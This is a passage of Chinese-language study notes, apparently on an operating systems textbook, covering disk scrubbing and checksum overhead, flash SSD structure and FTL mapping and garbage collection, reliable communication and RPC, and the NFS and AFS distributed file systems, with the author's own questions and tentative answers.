<h3 id="不定期擦拭"><a href="#不定期擦拭" class="headerlink" title="不定期擦拭"></a>不定期擦拭</h3><p>虽然当文件被访问时，检验和将会被核对；但问题是绝大多数的文件在写入后，就很少被访问了；而由于磁盘本身的物理特性，在使用一段时间后，其上面的块可能会自行发生变化，此时将导致检验和出错；随着时间的推移，错误将累积得越来越多，最终导致当发现错误时，恢复工作已经无法进行；</p>
<p>为了避免这个问题，磁盘系统一般会定期对所有数据块进行扫描，以便及时发现错误和修复，保持它们始终是正确干净的状态；</p>
<h3 id="校验和的开销"><a href="#校验和的开销" class="headerlink" title="校验和的开销"></a>校验和的开销</h3><p>由于每 4KB 的数据块需要一个 8 字节的校验和，因此整体空间开销在 0.2%，是一个可接受的范围，成本很小；但是计算开销则比较大，因为现在每访问一个数据块，都需要对其做校验和的计算和比对工作；</p>
<p>为了降低 CPU 开销，需要特别优化，将数据块的复制和校验，组合一个单独的简化活动；另外定期的擦净工作一般选择在夜间进行，此时电脑处于低工作荷载的状态中；</p>
<h2 id="36-基于闪存的-SSD"><a href="#36-基于闪存的-SSD" class="headerlink" title="36.基于闪存的 SSD"></a>36.基于闪存的 SSD</h2><h3 id="特点与构造"><a href="#特点与构造" class="headerlink" title="特点与构造"></a>特点与构造</h3><p>闪存有一个很有意思的特点，它在内部将存储单元分为块和页（块比页大）；当需要写入数据到某个块时，首先需要先将整个块的数据先删除掉，之后才能写入；而且，写入的次数是有上限的；因此，如果对某个页执行频繁的写入操作，将导致其很快老化；</p>
<blockquote>
<p>猜测之所以需要先删除，是因为需要让该块处于某种重置后的状态，在该状态下，块可以被放入电子；但是当电子放入后，就会破坏这种状态，导致无法再额外放入或取出电子；如果要写入新数据，则只能将整个块重新初始化；</p>
</blockquote>
<blockquote>
<p>问：如何构建闪存 SSD？如果应对昂贵的擦除成本？如果重写会缩短磁盘寿命的话，如果构建持久使用的磁盘？</p>
</blockquote>
<p>闪存的基本存储原理，是通过存储在晶体管中的电子数量，来判断该比特位所存储的值的；</p>
<ul>
<li>单层：如果电子数量超过某个临界值，则表示 1；反之表示 0；</li>
<li>双层：有多个电子数量的临界点，分别表示 00、01、10、11；</li>
<li>三层：原理同双层相似，差别在于可以表示 3 个比特位，即 000 ~ 111；</li>
</ul>
<blockquote>
<p>虽然层数越多，单个存储单元的容量越大，单位价格越低，但是性能会下降；单层的单位容量小，但性能最好；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201208090416.png"></p>
</blockquote>
<h3 id="从位到片"><a href="#从位到片" class="headerlink" title="从位到片"></a>从位到片</h3><p>显然 SSD 存储器操作的最小单元不可能是比特，而是一个更大的存储单元“页”；SSD 一般由多块存储片构成，每个存储片中有 n 个块；每个块中有 n 个页；</p>
<ul>
<li>块大小：128 ~- 256KB（相当于 32 ~ 64 个页）</li>
<li>页大小：512B ~ 4KB；</li>
</ul>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201208084736.png"></p>
<h3 id="以块为单位的操作"><a href="#以块为单位的操作" class="headerlink" title="以块为单位的操作"></a>以块为单位的操作</h3><p>闪存芯片一般支持三个低级别的操作：</p>
<ul>
<li>读取（页）：给定页编号即可，非常快，没有寻道成本，随机读取和顺序读取的性能几乎相同，约 10 微秒；</li>
<li>擦除（块）：将数据写入指定页前，需要将页所在的块上面的数据全面清除，之后才能写入（原因很简单：闪存是以存储单元中的电子量来表示值的，因此需要先将存储单元设置成某个初始化状态，之后才能够正确的放入电子）；擦除的成本比较高，需要约 1 毫秒（跟读取的速度相差 100 倍）；</li>
<li>写入（页）：当某个块被擦除后，就可以开始往里面的页写入数据了；写入的时间成本约 100 微秒；</li>
</ul>
<h4 id="写入过程"><a href="#写入过程" class="headerlink" title="写入过程"></a>写入过程</h4><p>根据页号找到所在的块，此时整个块的状态为 VALID（表示其上面的数据可读）；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201208090202.png"></p>
<p>将块的状态变更为 ERASED（此时块上所有页中的存储单元，都会被置为 1）；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201208090217.png"></p>
<p>根据页号，将某个页中存储单元的电子量设置为预期的状态（设置成功即表示数据写入成功），写入完成后，该页的状态会从 ERASED 变成 VALID；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201208090228.png"></p>
<blockquote>
<p>问：好奇剩下的三个页仍为 ERASED 状态，那么未来再向它们写入数据时，它们会处于什么样的状态？是否需要重置整个块？</p>
<p>答：貌似剩下的三个页下次可以直接往里面写入数据；只有当需要向已经是 VALID 的存储单元写入数据时，才需要将整个块重置为 ERASED 状态；</p>
</blockquote>
<h3 id="性能与可靠性"><a href="#性能与可靠性" class="headerlink" title="性能与可靠性"></a>性能与可靠性</h3><h4 id="老化"><a href="#老化" class="headerlink" title="老化"></a>老化</h4><p>闪存由于全部是硅晶体管构成的，没有传统磁盘中的机械结构，因此它出现故障的可能要比传统磁盘低一些（例如肯定不会出现磁头撞到盘面的情况）；闪存主要的问题是老化，因为每次向存储单元写入数据时，是往里面放入电子；每次清除其中的电子时，都会有一些残留；随着时间的推移，这些残留会累积；当累积到一定的程度后，就很难用该存储单元的电子数量来区分它当前是处于 0 还是 1 的状态了，这个时候该存储单元便不再可用了；</p>
<blockquote>
<p>闪存生产商的数据是单层 SLC 的可擦写次数大约在 10 万次，双层 MLC 大约在 1 万次（但目前还不是非常确定，因为第三方的实验数据发现寿命好像比预想的还要更长一些）；</p>
</blockquote>
<h4 id="干扰"><a href="#干扰" class="headerlink" title="干扰"></a>干扰</h4><p>另外一个会影响可靠性的点是干扰；当某个存储单元被读取或写入时，有可能会干扰旁边存储单元中的电子数量；当干扰超过某个临界点时，会造成位翻转，导致单元中存储的值不再准确；</p>
<h3 id="从存储片到-SSD"><a href="#从存储片到-SSD" class="headerlink" title="从存储片到 SSD"></a>从存储片到 SSD</h3><blockquote>
<p>在 SSD 出现之前，传统机械磁盘已经和文件系统形成了成熟的接口，因此 SSD 需要提供向后的兼容性， 以便能够让文件系统无感知的使用 SSD；</p>
</blockquote>
<p>为了实现向后的兼容性，SSD 提供了一个中间的翻译层 FTL，Flash Translation Layer；它负责提供跟传统机械磁盘一样的接口，供文件系统调用，并将其翻译成内部指令；</p>
<p>为了提高性能，SSD 一般会将数据并行写在多个闪存存储芯片上（这点跟有多个盘面的机械硬盘其实是一样的）；另外需要降低写放大；</p>
<blockquote>
<p>写放大 &#x3D; FTL 发给闪存芯片的指令数量 &#x2F; 文件系统发给 FTL 的指令数量</p>
</blockquote>
<p>为了提高使用寿命，FTL 需要将数据尽可能均匀的写入到所有存储单元中，避免某些存储单元被写入的更多，导致过早老化；</p>
<p>为了减少写入干扰，FTL 通常会按页的顺序写入数据，从低页写到高页，避免无序写入，减少干扰几率；</p>
<blockquote>
<p>实现 FTL 的最简单方式是使用直接映射，但是这会带来非常严重的问题，一是性能问题，因为写入页需要擦除块，因此会需要先复制块中的数据，之后再重新写入，这导致高昂的写入放大；二是寿命问题，文件的元数据不可避免会频繁更新，因此直接映射将导致某些存储单元也频繁更新，很快达到使用寿命的上限；</p>
</blockquote>
<h3 id="日志结构的-FTL"><a href="#日志结构的-FTL" class="headerlink" title="日志结构的 FTL"></a>日志结构的 FTL</h3><p>文件系统中常用的日志结构刚好非常适合 FTL 的场景，每次更新数据的时候，都不覆盖旧的数据，而是在新的位置写入；</p>
<p>对于文件系统来说，哪些空间是空闲的，是由它自己在管理的，这意味着文件系统有自己的一套块编号系统，该系统与 SSD 内部的页编号并不相同，因此 SSD 内部还需要提供一张映射表，记录文件系统的块，对应自己内部的哪个页；</p>
<blockquote>
<p>示例：文件系统的块 100、101、2000、2001，对应内部的页 0、1、2、3；</p>
</blockquote>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201209091802.png"></p>
<blockquote>
<p>问题：SSD 需要将映射表存储在哪里？</p>
<p>答：理论上猜测肯定是存储在 SSD 本身的存储单元里；对于日志结构策略来说，整个文件系统 imap 表是不断移动的，即随着数据更新，不断写入到最新的位置；而且单个文件的 inode 也会随着更新，不断在变化位置；数据块也是如此；只有当 inode 和数据块中的数据没有发生改变时，它们的位置才是固定的；</p>
<p>但是以上的分析是站在文件系统的角度，对于 SSD 来说，它还有额外的一个翻译映射层，即需要将文件系统的逻辑块，映射到自己的物理块地址；这个映射表是独立于文件系统的 imap、inode 之外的；它是对 inode 中读取到的指针的再次翻译好像？</p>
<p>没错，而且有些 SSD 内部还有专门的 RAM 内存，用来在运行时加载该映射表，以提高翻译的速度；当然，有些 SSD 的策略是加载到主机的内存里，共享主机的内存，但由于不能无限占用主机的所有内存，肯定会设置一个上限；有可能这个上限小于整个映射表的大小，此时只能加载部分映射表到主机的内存中；由此当发生缓存不命中时，就需要先从闪存中读取未命中的映射数据，加载到内存里；这样的话， 对于主机来说，一条读取数据的指令，其实发生了两条从闪存中加载数据的指令，一次是加载映射表，一次是加载目标数据；</p>
<p>发现 SSD 内部的页表映射机制，跟 CPU 的虚拟内存地址映射是一毛一样的；</p>
</blockquote>
<p>日志结构的 FTL 有两个缺点：</p>
<ul>
<li>由于新数据总是写入新位置，而不是覆盖旧数据，这意味着旧位置的数据变成垃圾，需要定期清理，以便能够回收空间；但过度的垃圾回收会增加写放大和降低性能；</li>
<li>随着 SSD 容量的变大，SSD 内部需要越来越大的内存，以便能够存储映射表；</li>
</ul>
<h3 id="垃圾回收"><a href="#垃圾回收" class="headerlink" title="垃圾回收"></a>垃圾回收</h3><p>对于任何使用日志结构的系统来说，垃圾回收都将是不可避免的；当 SSD 决定运行垃圾回收时，它可以通过读取页中的块编号，并查询映射表，但相应的块编号指向的页编号是否匹配，如果不匹配，意味着该页已经变成了死页，或者叫垃圾页，可以进行回收；如果块中只有部分页是死页，部分页是活页，那么回收成本很高；因为 SSD 需要先将活页的数据复制出来，并写入到新的页中；为了降低回收成本，更好的办法是优先回收那些全部由死页构成的块，这样就不需要复制和写入数据了；</p>
<p>以上机制的成本仍然不低，因为需要扫描整个 SSD；由于文件系统本身也维护着空闲空间的管理，因此文件系统自己也清楚哪些逻辑块是垃圾块；SSD 可以通过提供一个额外的 trim 接口，让文件系统调用，告知哪些块可以释放，然后直接在 FTL 释放它们即可，少去了扫描的成本；</p>
<blockquote>
<p>问：好奇 SSD 内部 FTL 如何管理自己的空闲空间？还是说直接不管理，交给文件系统来处理？万一有的文件系统没有这个功能呢？</p>
</blockquote>
<h3 id="映射表尺寸"><a href="#映射表尺寸" class="headerlink" title="映射表尺寸"></a>映射表尺寸</h3><h4 id="块映射"><a href="#块映射" class="headerlink" title="块映射"></a>块映射</h4><p>块映射是一种直接映射，目的是为了减少页表的大小时，因为如果按页进行直接映射的话，假设一条映射条目（页指针）需要占用 4 比特的空间，对应一个 4KB 的页；那么对于 1TB 的 SSD 来说，将需要 1GB 缓存以存储映射表，显然，这个映射成本太高了；如果换成使用块映射（块指针）的话，可以省下缓存空间，但是付出的代价是降低了性能，因为任何一个页的数据变更，都将导致整个块的迁移重写；</p>
<h4 id="混合映射"><a href="#混合映射" class="headerlink" title="混合映射"></a>混合映射</h4><p>为了解决块映射的性能问题，FTL 引入了混合映射；它的策略是使用两个映射表，一个是日志表（负责页映射），一个数据表（负责块映射）；这样既能够得到页映射的性能，又能够得到块映射的空间；</p>
<p>当 FTL 收到文件系统的数据读取指令后，优先到页映射表中查找物理地址，如果找不到，再到块映射表中查询；</p>
<blockquote>
<p>貌似优先到页映射表中查找，可以利用上局部性原理的好处；</p>
</blockquote>
<p>当 FTL 收到文件系统的数据写入指令后，先将数据写入新的块，然后将新块的地址保存页映射表中；当某个新块中的页都按顺序被写满后，就把该块的地址迁移到块映射表中；</p>
<h5 id="切换合并"><a href="#切换合并" class="headerlink" title="切换合并"></a>切换合并</h5><p>块中的页写满后，由原来的页映射切换为块映射；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201210090801.png"></p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201210090901.png"></p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201210090944.png"></p>
<h5 id="部分合并"><a href="#部分合并" class="headerlink" title="部分合并"></a>部分合并</h5><p>假设出现了只有部分页被重写的情况，则 FTL 需要将未被重写的页，复制一份到新的块中；完成这个动作需要额外的 I&#x2F;O 操作，因此会导致一定的写放大；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201210092717.png"></p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201210090944.png"></p>
<h5 id="完全合并"><a href="#完全合并" class="headerlink" title="完全合并"></a>完全合并</h5><p>假设某个日志块中的四个页，分别写入了四个不同的逻辑块的数据；当需要将它们从日志表迁移到数据表时，就需要做很多动作；需要读取每个逻辑块余下的页的数据，然后新建一个物理块，写入这些数据；同样的操作，每个逻辑块都需要做一遍，共做四遍；</p>
<h4 id="页映射缓存"><a href="#页映射缓存" class="headerlink" title="页映射缓存"></a>页映射缓存</h4><p>由于混合映射过于复杂，另外一个解决方案是仍然使用页映射，但为其引入缓存机制（这个机制跟 CPU 中的虚拟内存地址映射缓存一毛一样）；其思路就是使用有效的缓存，来完成映射的工作；由于缓存有限，此时不再能将整个映射表一次加载到缓存中了，只能是部分加载（并且如果满了后，还需要剔除部分不常用的）；由于计算过程中必然存在的局部性，这种机制工作起来能够取得性能和成本的良好平衡；</p>
<h3 id="减缓老化"><a href="#减缓老化" class="headerlink" title="减缓老化"></a>减缓老化</h3><p>为了避免某个存储单元由于频繁擦写，导致过快出现老化， FTL 需要尽可能的将写入分摊到所有存储单元中；虽然日志写入策略，能够很好的实现分散化；但是电脑中的部分数据有可能在写入之后，就很被再次改写了，这样导致这些存储单元没有分摊到应尽的责任；为了避免这个问题， FTL 需要定期将这些不活跃的数据，迁移到其他存储单元，以便激活它们，承担更多的写入责任；</p>
<blockquote>
<p>看来 FTL 还需要额外承担不时照看那些数据长期不更新的块，不定期把块中的数据迁移到其他写入次数比较多的块，以便可以利用这些数据长期不更新块的使用寿命；</p>
</blockquote>
<h3 id="性能和成本"><a href="#性能和成本" class="headerlink" title="性能和成本"></a>性能和成本</h3><p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201210100544.png"></p>
<p>SSD 的随机写入之所以比随机读取性能更好，其原因在于内部 FTL 使用的日志策略；该策略将随机写入在一定程度上转变成了顺序写入；</p>
<blockquote>
<p>按理说机械硬盘也存在着相同的现象；</p>
</blockquote>
<h2 id="37-分布式系统"><a href="#37-分布式系统" class="headerlink" title="37.分布式系统"></a>37.分布式系统</h2><p>分布式系统需要应对诸多方面的挑战，包括机器故障、数据包丢失、网络延迟、安全保障等；</p>
<h3 id="通信常态"><a href="#通信常态" class="headerlink" title="通信常态"></a>通信常态</h3><p>不可靠的通信是网络中的常态，少数情况是由于电气原因引起的，多数是由于某个节点的缓冲区不足造成的；由于该节点在单位时间内收到了超过其本身内存可存储的数据包，迫使其必须丢弃一些后到的数据包，因此造成了丢包的现象；</p>
<blockquote>
<p>问：既然丢包是网络中的常态，那应如何应对丢包的问题？</p>
<p>答：从通信协议入手；</p>
</blockquote>
<h3 id="不可靠的通信层"><a href="#不可靠的通信层" class="headerlink" title="不可靠的通信层"></a>不可靠的通信层</h3><p>应对不可靠通信的方法之一是：不管它；因为对于某些应用程序来说，丢失一些数据包问题不大（例如视频类的应用）；或者其内部有其他应对丢包的方法（例如通过校验和确认完整性，当发现丢包时，要求对方重发）；</p>
<h3 id="可靠的通信层"><a href="#可靠的通信层" class="headerlink" title="可靠的通信层"></a>可靠的通信层</h3><p>构建可靠的通信涉及到四个动作：</p>
<ul>
<li>确认的动作：acknowledgment，简称 ack；当接收方收到数据包后，发送一条 ack 消息给发送方，让发送方知悉数据包已经安全到达；</li>
<li>判断超时的动作：timeout；当发送方在一定的时间内，未收到接收方发回的 ack 消息，则判断数据包在传输的过程中丢失了；</li>
<li>重试的动作：当发送方判断数据包丢失后，重新发送一次数据包；</li>
<li>编号的动作：如果接收方发送的 ack 消息在路上丢失了，发送方会重新发送数据包；为了让接收方知悉收到了重复的数据包，双方就每次要发送的数据包进行顺序的编号；这样如果接收方收到相同编号的数据包，则只需要发回 ack 消息，而无须额外处理该数据包；</li>
</ul>
<blockquote>
<p>超时时间的设置是一个有意思的点，设得太小的话，发送方要消耗更多的 CPU 和带宽；设得太大的话，发送方提供的服务性能降低；</p>
<p>由于单个服务器经常对应多个客户端，因此有可能某个时间点，服务器会收到很多客户端的请求，导致过载；如果这些客户端都在一个固定的超时间隔后，再次发起重试的请求，将再次导致服务器过载，之后一直不断陷入死循环。为了避免这种情况发生，一般重试的时间间隔采用“指数倒退”的方案，即下一次重试的时间，是上一次的倍数，例如2倍；</p>
</blockquote>
<h3 id="分布式共享内存"><a href="#分布式共享内存" class="headerlink" title="分布式共享内存"></a>分布式共享内存</h3><p>DSM，Distributed Shared Memory，它的构想是我台机器共享一个大的虚拟地址空间，当访问某个不在本地内存中的数据时，触发页错误，然后由操作系统调用网络通信，访问其他机器上面的数据；</p>
<blockquote>
<p>这种分布式方案不是很有实用性，因为本地机器的优点在于 CPU 和快速的内存，现在将内存做成分布式的，反而自断长处了；更好的做法可能是将数据做成分布式的，将数据通过网络分发到多台机器上进行计算，最后再网络汇总各台机器的计算结果即可；</p>
</blockquote>
<h3 id="远程过程调用-RPC"><a href="#远程过程调用-RPC" class="headerlink" title="远程过程调用 RPC"></a>远程过程调用 RPC</h3><p>RPC，remote procedure call；其思路是像调用本地机器上的函数一样，调用远程机器上的代码并执行它；RPC 系统通常由两部分组成，存根生成器（stub generator）和运行时库（runtime）；</p>
<h4 id="存根生成器"><a href="#存根生成器" class="headerlink" title="存根生成器"></a>存根生成器</h4><p>既然是远程调用，不可避免涉及到与远程的机器进行通信，如果每个调用的应用程序，都需要自己处理这些通信的细节，既低效也容易出错。因此，所谓的存根生成器，其实就是对通信动作的抽象，让调用它的应用程序，可以不用关心底层的实现细节，像调用普通函数一样调用 RPC 即可；</p>
<blockquote>
<p>好奇存根生成器跟普通的 HTTP 请求有什么本质上的区别？</p>
</blockquote>
<p>客户端存根生成器执行的动作：</p>
<ul>
<li>创建缓冲区（申请一段内存空间）；</li>
<li>将消息放到缓冲区中：包括调用的函数 ID、函数参数、消息长度等；</li>
<li>将消息发送到 RPC 服务器上；</li>
<li>等待回复</li>
<li>收到回复，解包返回的数据，例如状态码、调用结果等；</li>
<li>返回结果给调用者；</li>
</ul>
<p>服务端的存储生成器执行的动作；</p>
<ul>
<li>解包客户端发过来的消息：提取函数 ID 和参数；</li>
<li>调用实际的函数；</li>
<li>打包结果，放入回复的缓冲区；</li>
<li>发送结果给客户端；</li>
</ul>
<h4 id="运行时库"><a href="#运行时库" class="headerlink" title="运行时库"></a>运行时库</h4><p>运行时库才是真正处理底层的脏活和累活，例如机器路由、传输协议等；它的职责是解决性能和可靠性的问题；</p>
<blockquote>
<p>为了提高调用效率，运行时库一般构建在 UDP 协议上，然后将可靠性交给运行时库自己内部来处理；虽然 TCP 协议可以帮忙处理可靠性的问题，但由它处理的层级比较低，并不能取得最好的性能；</p>
</blockquote>
<h4 id="其他问题"><a href="#其他问题" class="headerlink" title="其他问题"></a>其他问题</h4><h5 id="多久超时"><a href="#多久超时" class="headerlink" title="多久超时"></a>多久超时</h5><p>虽然设置了超时机制，但并不是万能的；因为有些远程调用本身确实需要很长的处理时间，如果一刀切的将它们判断为调用失败，并重新发送消息显然是不合适的；此时应该向服务端请求最新状态，如果对方回复仍在处理中，则应该继续保持等待；</p>
<h5 id="超大参数"><a href="#超大参数" class="headerlink" title="超大参数"></a>超大参数</h5><p>有时传输的参数可能很大，此时运行时库需要提供消息的分组功能和重组功能；</p>
<h5 id="不同字节序"><a href="#不同字节序" class="headerlink" title="不同字节序"></a>不同字节序</h5><p>还有另外一个讨厌的问题是不同的机器可能使用不同字节序，有些使用大端法，有些使用小端法；因此，RPC 通常会在其消息体中明确标识当前消息内容所使用的字节序，以免对方弄错，并根据需要进行转换；</p>
<blockquote>
<p>单台机器的故障概率是很小的，但是当一个系统是由几千台机器组成时，故障变成了大概率的事件；因此，如何正确有效的处理故障，则构建分布式系统的首要问题；</p>
</blockquote>
<h2 id="38-Sun-的网络文件系统（NFS）"><a href="#38-Sun-的网络文件系统（NFS）" class="headerlink" title="38. Sun 的网络文件系统（NFS）"></a>38. Sun 的网络文件系统（NFS）</h2><blockquote>
<p>如何构建共享文件系统？要考虑哪些问题？哪些点容易出错？</p>
</blockquote>
<h3 id="基本分布式文件系统"><a href="#基本分布式文件系统" class="headerlink" title="基本分布式文件系统"></a>基本分布式文件系统</h3><p>通常情况下，应用程序访问本地的文件系统来获取想要的持久性数据，对于分布式文件系统来说，应用程序改成访问客户端文件系统，它提供了一层抽象，接口仍然同普通的文件系统一样，所以对于应用程序来说，是透明无感知的；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201216081219.png"></p>
<h3 id="开放协议"><a href="#开放协议" class="headerlink" title="开放协议"></a>开放协议</h3><p>最早的比较成功的分布式文件系统是 SUN 公司开发的 NFS，它通过制定协议的标准，引导行业人员采用该协议，并可以自行开发自己的 NFS 服务器，而不是限定只能使用 SUN 公司的版本，这种做法使用该协议迅速成为行业的标准；</p>
<h3 id="目标：简单快速的崩溃恢复"><a href="#目标：简单快速的崩溃恢复" class="headerlink" title="目标：简单快速的崩溃恢复"></a>目标：简单快速的崩溃恢复</h3><p>对于多客户端单服务器的场景来说，实现快速的崩溃恢复是非常重要的，因为在崩溃期间，客户端完全无法使用文件系统；NFSv2 采取的做法是使用无状态的协议，这使得服务器端无须管理客户端当前的状态，从而最大程度的降低崩溃恢复成本；</p>
<h3 id="无状态与映射"><a href="#无状态与映射" class="headerlink" title="无状态与映射"></a>无状态与映射</h3><p>普通文件系统的系统调用是基于有状态的场景来设计的（例如使用文件描述符），如果想在客户端和服务器之间实现无状态的协议，就需要对原始的系统调用做一次封装；它们之间不可以是简单的 RPC，只是传递函数名称和参数，而是应该传递更多更完整的文件信息，包括卷标识、文件 inode 编号等；NFSv2 通过引入文件句柄来实现这一目的，每次通信，客户端都需将文件句柄传递给服务端，用来告知服务器自己想访问的是哪一个文件；</p>
<blockquote>
<p>文件句柄：用来唯一标识服务端文件或目录的一种机制；它的思路其实很简单，本来文件系统上的各个文件原本就有唯一标识，现在将这些唯一标识的信息封闭成文件句柄的形式；这样当客户端给出某个文件句柄时，就能定位到某个具体的文件或目录；同时客户端会发送对这些文件的操作名称（即系统调用名称），服务端按要求进行操作即可；</p>
<p>世代号：一个新玩意，用来标识当前客户端读取的文件位置的状态；</p>
</blockquote>
<p>虽然服务器端是无状态的，但是客户端的文件系统是有状态的；它会创建本地的文件描述符，来映射服务器返回的文件句柄，并且记录当前文件的位置，之后做为偏移量的参数，包含在请求中，发送给服务端；</p>
<blockquote>
<p>客户端文件系统有维护一张映射表，映射每个路径下的文件和目录在服务端的对应句柄；</p>
</blockquote>
<h3 id="处理服务器故障"><a href="#处理服务器故障" class="headerlink" title="处理服务器故障"></a>处理服务器故障</h3><p>通信故障是网络常态，因此客户端发出的请求有可能在中途丢失，另外服务器端也有可能处于崩溃重启的状态，无法正常响应客户端的请求；客户端通过超时重试的机制，来应对通信故障的场景；</p>
<p>对于大多数的只读操作来说，不管客户端发出几次相同的请求，最终得到的结果都是一样的（即这些操作具有幂等性）；</p>
<p>对于写操作来说，也是幂等的，因为在相同位置多次写入数据，最终得到的结果仍然是相同的；</p>
<p>对于创建目录的操作来说，则没有幂等性，因为如果目录已经存在了，则再次创建会返回失败的消息；</p>
<h3 id="提高性能：缓存"><a href="#提高性能：缓存" class="headerlink" title="提高性能：缓存"></a>提高性能：缓存</h3><p>就像本地机器在将数据写入硬盘时，会使用缓存机制实现集中批量写入，以提高性能的做法一样 ，客户端文件系统与服务端之间，也可以引入缓存；让数据的读取和写入的性能更好；</p>
<h3 id="缓存一致性问题"><a href="#缓存一致性问题" class="headerlink" title="缓存一致性问题"></a>缓存一致性问题</h3><p>当多个客户端都对同一份文件中的数据进行缓存时，就会出现缓存一致性的问题；因为有可能某个客户端在其缓存中更新了文件数据，但暂时未推送到服务器上面，则此时其他客户端看到的仍然是旧版本的数据；</p>
<blockquote>
<p>貌似可以引入类似 git 的文件版本管理机制；</p>
</blockquote>
<p>NFS 通过两个机制来解决缓存一致性问题：</p>
<ul>
<li>关闭时刷新：当客户端关闭某个文件后，出现缓存中有一些更新未推送到服务器，则将马上触发推送。以便其他客户端随后登录文件系统时，能够看到最新版本的数据；</li>
<li>打开时检查：当客户端访问某个文件时，如果发现本地已经有缓存，此时它会先向服务端发送一个请求，检查服务端的版本是否和本地缓存一致，如果不一致，则不使用缓存，而是从服务器拉取最新的版本；</li>
</ul>
<blockquote>
<p>客户端在检查本地文件缓存是否为最新版本时，需要设置一个检查的时间间隔，避免过于频繁的向服务器发起请求，不然服务端会收到大量的 GETATTR 请求，但实际上在大部分时间内，文件本身并没有什么变化；</p>
</blockquote>
<h3 id="服务端缓存的隐藏问题"><a href="#服务端缓存的隐藏问题" class="headerlink" title="服务端缓存的隐藏问题"></a>服务端缓存的隐藏问题</h3><p>不止客户端会使用缓存机制，事实上服务器端的内存与硬盘的交互之间，也存在缓存机制，这会带来一个隐含的一致性问题；即如果服务端在收到某个客户端的写入请求后，并没有将数据立即写入持久性设备硬盘，而只是先写在了内存中，并向客户端报告已经成功写入；如果此时服务器发生崩溃，则未写入的数据将会丢失，但是客户端却误会以为已经成功了；</p>
<p>这个问题很棘手，并且不可避免，有两种常见的应对办法：</p>
<ul>
<li>在服务端增加一个有备份电池的内存，这样即使服务端出现断电或崩溃，数据也不会丢失；</li>
<li>服务端使用专门为快速写入磁盘而设计的文件系统，以避免普通磁盘在处理立即写入时产生的性能问题；</li>
</ul>
<h2 id="39-Andrew-文件系统-AFS"><a href="#39-Andrew-文件系统-AFS" class="headerlink" title="39.Andrew 文件系统 AFS"></a>39.Andrew 文件系统 AFS</h2><h3 id="AFS-版本1"><a href="#AFS-版本1" class="headerlink" title="AFS 版本1"></a>AFS 版本1</h3><p>版本一的设计思路是全文件缓存，即首次打开文件后，就将整个文件下载到本地磁盘，后续的读写操作都在本地运行，调用本地文件系统的接口即可，无需网络通信，性能很好；当文件关闭后，再将修改传输回服务器；</p>
<p>第二次打开文件时，会检查文件的本地版本和服务器版本是否一致，若一致，则直接使用本地副本，不再从服务端拉取；</p>
<p>存在的问题：</p>
<ul>
<li>路径查找成本比较高：每个客户端发送一个请求，服务端都需要按完整的路径进行文件定位，消耗了很多服务器的CPU 时间；</li>
<li>类似 NFS，客户端发出很多版本检查的请求，占用了大量服务端的 CPU 和带宽；</li>
</ul>
<h3 id="AFS-版本2"><a href="#AFS-版本2" class="headerlink" title="AFS 版本2"></a>AFS 版本2</h3><p>针对版本1存在的问题，版本2引入了以下的解决方案：</p>
<ul>
<li>反复查询状态问题：引入了回调机制，即文件版本是否变更，不再由客户端发起查询，而是由服务端来通知客户端（貌似这需要保持一个长连接，不然通知不到了）；</li>
<li>反复查找路径问题：引入文件标识符（FID，file Identifier，类似 NFS 中的文件句柄）来替代路径名；客户端在查找路径过程中，缓存结果在本地，这样下次查找，可以通过本地缓存找到路径对应的文件标识符，之后发送标识符到服务端即可，避免了服务端反复查找路径的问题（貌似借鉴了 NFS 中文件句柄的机制）；</li>
</ul>
<p>注意：每次客户端从服务端获取一个文件或者目录时，都会在服务端建立一个回调，以便让文件或目录有变更，服务端可以通知客户端更新；</p>
<blockquote>
<p>后来发现服务端的更新通知非常简单粗暴，只是中断回调而已，其他啥事也没有做；当客户端发现回调中断后，就到服务端重新拉取最新的版本；</p>
</blockquote>
<h3 id="缓存一致性"><a href="#缓存一致性" class="headerlink" title="缓存一致性"></a>缓存一致性</h3><p>更新可见性和缓存过期问题：当客户端关闭一个文件时，如果文件发生了变更，客户端就在第一时间将文件推送到了服务端；之后服务端会中断其他打开该文件客户端的回调；这样其他客户端就在第一时间知道了文件发生了更新，顺带解决了缓存过期问题；</p>
<blockquote>
<p>当同一个客户端的不同进程，打开同一份文件时，由于本地缓存的存在，A 进程对文件的更新，对于 B 进程来说是实时可见的，因为它们都是访问的本地缓存，虽然此时服务端的版本可能是旧的，因为本地缓存的更新暂时还没有推送到服务端；</p>
</blockquote>
<p>如果两个客户端同时修改一个文件，AFS 执行最后更新者胜出的策略，即以最后一个将更新推送到服务端的版本为准；</p>
<h3 id="崩溃恢复"><a href="#崩溃恢复" class="headerlink" title="崩溃恢复"></a>崩溃恢复</h3><p>崩溃有两种情况，一种是客户端崩溃，一种是服务端崩溃；</p>
<p>当客户端崩溃后，其原本和服务端建立的连接将失效，此时如果服务端的文件发生了变更，则服务端将无法通知客户端该变更；因此，客户端在崩溃恢复后，应该将本地的缓存视为可疑，重新和服务端建立连接，并确认版本是否有过期；</p>
<p>当服务端发生崩溃后，由于回调都存储在内存中，因此所有的回调将失效，服务端再也无法主动联系客户端并推送消息了；有两种办法可以解决该问题：</p>
<ul>
<li>客户端定期检查与服务端的连接是否正常，如果发现服务端掉线，则立即将本地所有缓存标记为可疑，之后当访问本地缓存时，就跟服务端确认一下版本；</li>
<li>当客户端和服务端再次建立连接后，服务端主动告知客户端其本地缓存应该标记为可疑；</li>
</ul>
<blockquote>
<p>此处碰到的问题，都很像是使用 websocket 进行消息通知时会遇到的问题；</p>
</blockquote>
<h3 id="扩展性和性能"><a href="#扩展性和性能" class="headerlink" title="扩展性和性能"></a>扩展性和性能</h3><p>优点：</p>
<ul>
